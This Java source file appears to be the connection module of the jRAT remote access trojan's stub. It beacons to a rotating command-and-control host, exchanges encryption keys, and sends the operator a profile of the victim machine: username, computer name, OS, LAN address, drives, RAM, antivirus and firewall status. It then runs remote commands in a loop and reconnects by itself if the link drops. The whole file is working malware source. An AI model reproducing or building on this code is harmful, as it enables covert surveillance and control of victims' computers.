package se.jrat.stub;

import java.awt.GraphicsEnvironment;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.InputStream;
import java.io.OutputStream;
import java.lang.management.ManagementFactory;
import java.net.InetAddress;
import java.net.Socket;
import java.security.PublicKey;
import java.util.Locale;

import se.jrat.common.Version;
import se.jrat.common.codec.Hex;
import se.jrat.common.crypto.Crypto;
import se.jrat.common.crypto.KeyExchanger;
import se.jrat.common.io.StringWriter;
import se.jrat.stub.packets.incoming.AbstractIncomingPacket;
import se.jrat.stub.packets.outgoing.AbstractOutgoingPacket;
import se.jrat.stub.packets.outgoing.Packet10InitDefaultLocale;
import se.jrat.stub.packets.outgoing.Packet13Status;
import se.jrat.stub.packets.outgoing.Packet14InitComputerName;
import se.jrat.stub.packets.outgoing.Packet15InitServerID;
import se.jrat.stub.packets.outgoing.Packet16InitOperatingSystem;
import se.jrat.stub.packets.outgoing.Packet1InitHandshake;
import se.jrat.stub.packets.outgoing.Packet22InitUsername;
import se.jrat.stub.packets.outgoing.Packet23InitInstallPath;
import se.jrat.stub.packets.outgoing.Packet25InitJavaVersion;
import se.jrat.stub.packets.outgoing.Packet26InitJavaPath;
import se.jrat.stub.packets.outgoing.Packet28InitLanAddress;
import se.jrat.stub.packets.outgoing.Packet30InitVersion;
import se.jrat.stub.packets.outgoing.Packet31InitInstallationDate;
import se.jrat.stub.packets.outgoing.Packet36Initialized;
import se.jrat.stub.packets.outgoing.Packet47InitCountry;
import se.jrat.stub.packets.outgoing.Packet61InitMonitors;
import se.jrat.stub.packets.outgoing.Packet62InitDrives;
import se.jrat.stub.packets.outgoing.Packet63InitRAM;
import se.jrat.stub.packets.outgoing.Packet64InitAvailableProcessors;
import se.jrat.stub.packets.outgoing.Packet67LoadedPlugins;
import se.jrat.stub.packets.outgoing.Packet69InitAntivirus;
import se.jrat.stub.packets.outgoing.Packet70InitFirewall;

import com.redpois0n.oslib.OperatingSystem;
import com.sun.management.OperatingSystemMXBean;

public class Connection implements Runnable {

	public static boolean lock;

	public static Socket socket;
	public static boolean busy = false;
	public static FrameChat frameChat;

	public static InputStream inputStream;
	public static OutputStream outputStream;

	public static DataInputStream dis;
	public static DataOutputStream dos;

	public static PublicKey pubKey;
	
	public static final StringWriter sw = new StringWriter() {
		@Override
		public void writeLine(String s) throws Exception {
			Connection.writeLine(s);
		}
	};

	public void run() {
		try {
			Address address = DnsRotator.getNextAddress();

			socket = new Socket(address.getAddress(), address.getPort());

			socket.setSoTimeout(Configuration.timeout);
			//socket.setTrafficClass(24);

			Connection.inputStream = socket.getInputStream();
			Connection.outputStream = socket.getOutputStream();

			Connection.dis = new DataInputStream(inputStream);
			Connection.dos = new DataOutputStream(outputStream);
	        
			// outputStream.write(ConnectionCodes.DESKTOP_SLAVE); TODO Removed to make jRAT backwards compatible
			
			KeyExchanger exchanger = new KeyExchanger(dis, dos, Main.getKeyPair());
			exchanger.readRemotePublicKey();
			pubKey = exchanger.getRemoteKey();
			exchanger.writePublicKey();
			
			int len = dis.readInt();
			byte[] encKey = new byte[len];
			dis.readFully(encKey);
			Main.aesKey = Crypto.decrypt(encKey, Main.getKeyPair().getPrivate(), "RSA");
									
			Main.encryption = inputStream.read() == 1;

			initialize();

			status(Constants.STATUS_READY);

			for (Plugin plugin : Plugin.list) {
				plugin.methods.get("onconnect").invoke(plugin.instance, new Object[] { dis, dos });
			}

			while (true) {
				byte line = readByte();

				if (line == 0) {
					Connection.writeByte(0);
					continue;
				}
				
				AbstractIncomingPacket.execute(line);
			}
		} catch (Exception ex) {
			ex.printStackTrace();
			try {
				Thread.sleep(Configuration.reconnectSeconds * 1000L);
				new Thread(this).start();
			} catch (Exception e) {
				e.printStackTrace();
			}
		}
	}

	public static void initialize() throws Exception {
		addToSendQueue(new Packet30InitVersion(Version.getVersion()));
		
		addToSendQueue(new Packet1InitHandshake());

		addToSendQueue(new Packet31InitInstallationDate(Configuration.date));

		String computerName;
		if (OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS) {
			computerName = System.getenv("COMPUTERNAME");
		} else {
			computerName = System.getProperty("user.name");
		}
		addToSendQueue(new Packet14InitComputerName(computerName));

		addToSendQueue(new Packet16InitOperatingSystem(OperatingSystem.getShortOperatingSystem(), OperatingSystem.getLongOperatingSystem()));

		addToSendQueue(new Packet15InitServerID(Main.getID()));

		addToSendQueue(new Packet22InitUsername(System.getProperty("user.name")));

		addToSendQueue(new Packet23InitInstallPath(Main.class.getProtectionDomain().getCodeSource().getLocation().getPath()));

		addToSendQueue(new Packet25InitJavaVersion(System.getProperty("java.runtime.version")));

		addToSendQueue(new Packet26InitJavaPath(System.getProperty("java.home")));

		String localip;
		try {
			localip = InetAddress.getLocalHost().getHostAddress();
		} catch (Exception e) {
			localip = "Unknown";
		}
		addToSendQueue(new Packet28InitLanAddress(localip));

		addToSendQueue(new Packet47InitCountry(System.getProperty("user.country")));

		addToSendQueue(new Packet10InitDefaultLocale(Locale.getDefault()));

		addToSendQueue(new Packet62InitDrives(File.listRoots()));

		int ram = (int) (((OperatingSystemMXBean) ManagementFactory.getOperatingSystemMXBean()).getTotalPhysicalMemorySize() / 1024L / 1024L);
		addToSendQueue(new Packet63InitRAM(ram));

		addToSendQueue(new Packet64InitAvailableProcessors(Runtime.getRuntime().availableProcessors()));

		addToSendQueue(new Packet61InitMonitors(GraphicsEnvironment.getLocalGraphicsEnvironment().getScreenDevices()));

		addToSendQueue(new Packet69InitAntivirus());

		addToSendQueue(new Packet70InitFirewall());
		
		addToSendQueue(new Packet67LoadedPlugins()); // TODO
		
		addToSendQueue(new Packet36Initialized());
	}

	public static void addToSendQueue(AbstractOutgoingPacket packet) {
		while (lock) {
			try {
				Thread.sleep(10L);
			} catch (Exception ex) {
				ex.printStackTrace();
			}
		}
		packet.send(dos, sw);
	}

	public static void writeLine(String s) {
		try {
			String enc = Crypto.encrypt(s, Main.getKey(), "AES");
			if (enc.contains("\n")) {
				enc = "-h " + Hex.encode(s);
			}
			if (s.startsWith("-c ")) {
				enc = s;
			} else if (!Main.encryption) {
				enc = "-c " + s;
			}

			// dos.writeUTF(enc);
			dos.writeShort(enc.length());
			dos.writeChars(enc);
		} catch (Exception ex) {
			ex.printStackTrace();
		}
	}

	public static String readLine() {
		try {
			// String s = dis.readUTF();
			short len = dis.readShort();

			StringBuilder builder = new StringBuilder();
			for (int i = 0; i < len; i++) {
				builder.append(dis.readChar());
			}

			String s = builder.toString();

			if (s.startsWith("-h ")) {
				s = Hex.decode(s.substring(3, s.length()));
			} else if (s.startsWith("-c ")) {
				s = s.substring(3, s.length());
			} else {
				s = Crypto.decrypt(s, Main.getKey(), "AES");
			}

			return s;
		} catch (Exception e) {
			e.printStackTrace();
			return null;
		}
	}

	public static void writeShort(short i) throws Exception {
		dos.writeShort(i);
	}

	public static short readShort() throws Exception {
		return dis.readShort();
	}

	public static byte readByte() throws Exception {
		return dis.readByte();
	}

	public static void writeByte(int b) throws Exception {
		dos.writeByte(b);
	}

	public static boolean readBoolean() throws Exception {
		return dis.readBoolean();
	}

	public static void writeBoolean(boolean b) throws Exception {
		dos.writeBoolean(b);
	}

	public static int readInt() throws Exception {
		return dis.readInt();
	}

	public static void writeInt(int i) throws Exception {
		dos.writeInt(i);
	}

	public static long readLong() throws Exception {
		return dis.readLong();
	}

	public static void writeLong(long l) throws Exception {
		dos.writeLong(l);
	}

	public static void writeLine(Object obj) throws Exception {
		writeLine(obj.toString());
	}

	public static void status(String status) {
		addToSendQueue(new Packet13Status(status));
	}

	public static void status(int status) {
		addToSendQueue(new Packet13Status(status + ""));
	}

	public static void lock() {
		lock = !lock;
	}
}
